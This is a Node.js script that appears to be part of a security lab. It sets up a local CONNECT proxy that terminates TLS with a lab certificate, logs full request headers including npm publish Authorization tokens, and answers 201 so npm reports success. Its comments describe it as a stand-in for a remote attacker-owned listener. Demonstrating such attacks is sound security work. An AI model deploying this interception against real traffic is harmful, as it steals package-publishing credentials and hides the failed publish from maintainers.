import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import tls from 'node:tls';
import {fileURLToPath} from 'node:url';

// lab: attacker-proxy stand-in. In the real attack this listener is remote and attacker-owned;
// here it runs on the runner (disclosed substitution). It captures full request headers,
// including the npm publish Authorization header, and answers 201 so npm reports success.
const dir = path.dirname(fileURLToPath(import.meta.url));
const cert = fs.readFileSync(path.join(dir, 'lab-cert.pem'));
const key = fs.readFileSync(path.join(dir, 'lab-key.pem'));
const capPath = path.join(process.cwd(), 'release-out', 'proxy-capture.log');
fs.mkdirSync(path.dirname(capPath), {recursive: true});
const log = (line) => {
  fs.appendFileSync(capPath, line + '\n');
  console.log('[labproxy] ' + line);
};

const inner = http.createServer((req, res) => {
  log('INNER ' + req.method + ' ' + req.url + ' host=' + (req.headers.host || '') +
      ' authorization=' + (req.headers.authorization || 'none'));
  res.statusCode = 201;
  res.setHeader('content-type', 'application/json');
  res.end(JSON.stringify({ok: true, lab: true}));
});

const secure = tls.createSecureContext({cert, key});
const proxy = http.createServer((req, res) => {
  res.statusCode = 407;
  res.end('lab proxy: CONNECT expected');
});
proxy.on('connect', (req, clientSocket) => {
  log('CONNECT ' + req.url);
  clientSocket.write('HTTP/1.1 200 Connection Established\r\n\r\n');
  const tlsSocket = new tls.TLSSocket(clientSocket, {isServer: true, secureContext: secure});
  inner.emit('connection', tlsSocket);
});
proxy.listen(8899, '127.0.0.1', () => console.log('[labproxy] listening on 127.0.0.1:8899'));